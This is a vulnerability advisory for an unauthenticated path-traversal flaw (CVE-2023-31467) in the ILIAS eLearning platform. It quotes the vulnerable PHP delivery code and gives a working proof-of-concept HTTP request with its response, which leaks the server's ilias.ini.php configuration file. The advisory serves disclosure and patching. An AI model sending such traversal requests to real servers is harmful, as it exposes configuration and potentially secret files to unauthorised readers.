---
layout: post_collection_entry
date:   2023-02-02
categories: [advisory]
advisory_collection: ilias_multi_2023

title:  "[Advisory - ILIAS eLearning platform] Unauthenticated access to local files via path traversal"
advisory:  
  product: ILIAS eLearning platform
  homepage: https://www.ilias.de/en/about-ilias/  
  found: 2023-02-02 
  vulnerable_version: "<= 7.20, <= 8.1"
  fixed_version: "7.21, 8.2"
  cve: CVE-2023-31467
  impact_text: High
  impact_score: 7.5
  cvss: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
---

# Vulnerability overview
The file `ILIAS-7.20/Services/WebAccessChecker/web_access_checker.php` can be used to access local files and get the content of them. As there is no check if the requested file is in a specific directory, any file on the servers filesystem can be accessed.

To initialize the `Delivery` object (`ILIAS-7.20/Services/FileDelivery/classes/Delivery.php`) the value after the script name is used.

```php
# FILE: ILIAS-7.20/Services/WebAccessChecker/classes/class.ilWebAccessCheckerDelivery.php
protected function deliver()
{
    if (!$this->ilWebAccessChecker->isChecked()) {
        throw new ilWACException(ilWACException::ACCESS_WITHOUT_CHECK);
    }

    $ilFileDelivery = new Delivery($this->ilWebAccessChecker->getPathObject()->getCleanURLdecodedPath(), $this->http);
    $ilFileDelivery->setCache(true);
    $ilFileDelivery->setDisposition($this->ilWebAccessChecker->getDisposition());
    if ($this->ilWebAccessChecker->getPathObject()->isStreamable()) { // fixed 0016468
        $ilFileDelivery->stream();
    } else {
        $ilFileDelivery->deliver();
    }
}
```

For example the URL `http://ilias.local:9080/Services/WebAccessChecker/web_access_checker.php/data/myilias/./../../ilias.ini.php` uses `./data/myilias/./../../ilias.ini.php` as the parameter value for the `Delivery` object constructor.


## Proof of Concept
The following request gets the content of the file `ilias.ini.php` file.

```http
GET /Services/WebAccessChecker/web_access_checker.php/data/myilias/./../../ilias.ini.php HTTP/1.1
Host: ilias.local
Cookie: ilClientId=myilias;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/font-woff2;q=1.0,application/font-woff;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: font
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close


```

The response to this request contains the content of the file.

```http
HTTP/1.1 200 OK
Date: Wed, 26 Apr 2023 04:27:56 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: ilClientId=myilias; Path=/
Expires: Mon, 1 May 2023 04:27:56 GMT
Cache-Control: must-revalidate, post-check=0, pre-check=0
Pragma: public
X-ILIAS-FileDelivery-Method: php
ETag: 3a5c2de0b2c55f2d7fdc8de51eaf4854
Last-Modified: Wed, 26 Apr 2023 04:19:02 GMT
Content-Disposition: inline; filename="ilias.ini.php"
Content-Description: ilias.ini.php
Accept-Ranges: bytes
Content-Length: 1285
Connection: close
Content-Type: application/x-wine-extension-ini

; <?php exit; ?>
[server]
http_path = "http://ilias.local"
absolute_path = "/var/www/html"
presetting = ""
timezone = "UTC"

[clients]
path = "data"
inifile = "client.ini.php"
datadir = "/var/www/files"
default = "myilias"
list = "0"

[setup]
pass = ""

[tools]
......
```